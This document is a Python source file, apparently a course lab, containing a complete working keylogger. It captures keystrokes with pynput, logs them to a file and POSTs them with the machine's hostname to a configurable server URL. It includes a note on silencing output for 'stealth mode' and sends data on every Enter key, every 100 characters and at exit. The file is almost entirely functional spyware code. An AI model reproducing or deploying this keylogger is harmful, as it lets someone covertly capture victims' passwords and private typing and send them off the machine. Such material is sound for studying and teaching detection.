#!/usr/bin/env python3
"""
Lab 13: Keylogger with API Server Integration
Keylogger that sends logged data to an API server
"""

from typing import List
from pynput.keyboard import Key, Listener
import requests
import os
import time
import json
from datetime import datetime

# Global variables
char_count = 0
saved_keys = []
LOG_FILE = "log.txt"
API_URL = "http://localhost:8000/api/logs"  # Change this to your server URL

def send_log_to_server():
    """
    Sends the log.txt file content to the API server.
    Returns True if successful, False otherwise.
    """
    try:
        if not os.path.exists(LOG_FILE):
            return False
        
        # Read the log file
        with open(LOG_FILE, "r", encoding="utf-8") as file:
            log_content = file.read()
        
        if not log_content.strip():
            return False  # No content to send
        
        # Prepare data to send
        data = {
            "timestamp": datetime.now().isoformat(),
            "hostname": os.environ.get("COMPUTERNAME") or os.environ.get("HOSTNAME", "unknown"),
            "logs": log_content
        }
        
        # Send POST request to API server
        response = requests.post(
            API_URL,
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"[SUCCESS] Log data sent to server at {datetime.now()}")
            # Optionally clear the log file after successful send
            # with open(LOG_FILE, "w") as file:
            #     file.write("")
            return True
        else:
            print(f"[ERROR] Server responded with status {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[WARNING] Cannot connect to server at {API_URL}")
        return False
    except requests.exceptions.Timeout:
        print(f"[ERROR] Request timeout")
        return False
    except Exception as e:
        print(f"[ERROR] Failed to send log: {str(e)}")
        return False

def on_key_press(key: str):
    """
    Callback function that gets executed when a key is pressed.
    Prints the pressed key to the console.
    """
    try:
        # Comment out print for stealth mode
        # print("Key Pressed: ", key)
        pass
    except Exception as ex:
        print("There was an error: ", ex)

def on_key_release(key):
    """
    Callback function that gets executed when a key is released.
    Handles writing to a file when Enter or Space is pressed.
    Stops logging when the Escape key is pressed.
    Sends data to server periodically.
    """
    global saved_keys, char_count
    
    if key == Key.esc:  # Stop key logging if Escape key is pressed
        # Send remaining logs before exiting
        if saved_keys:
            write_to_file(saved_keys)
            send_log_to_server()
        return False
    else:
        if key == Key.enter:  # If Enter key is pressed, write keys to file
            write_to_file(saved_keys)
            
            # Send to server every time Enter is pressed (or modify for less frequent sends)
            send_log_to_server()
            
            char_count = 0
            saved_keys = []

        elif key == Key.space: 
            # If Space key is pressed, treat it as a separator
            key = " "
            write_to_file(saved_keys)
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1
        
        # Send to server every 100 characters (adjust as needed)
        if char_count >= 100:
            send_log_to_server()
            char_count = 0

def write_to_file(keys: List[str]):
    """
    Writes recorded keystrokes to a log file ('log.txt').
    Filters out keys that contain the word 'key' (e.g., Key.shift).
    """
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        for key in keys:
            key = str(key).replace("'", "")
            
            if "key".upper() not in key.upper():
                file.write(key)
        
        file.write("\n")

if __name__ == "__main__":
    # Ensure log file exists
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as file:
            file.write(f"Keylogger started at {datetime.now().isoformat()}\n")
    
    print("Keylogger started...")
    print(f"Log file: {LOG_FILE}")
    print(f"API endpoint: {API_URL}")
    print("Press ESC to stop logging")
    print("=" * 50)
    
    # Start the keylogger using the Listener
    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join(timeout=30*60)  # Run for 30 minutes
    
    # Final send before exiting
    send_log_to_server()
    print("Keylogging ended.")

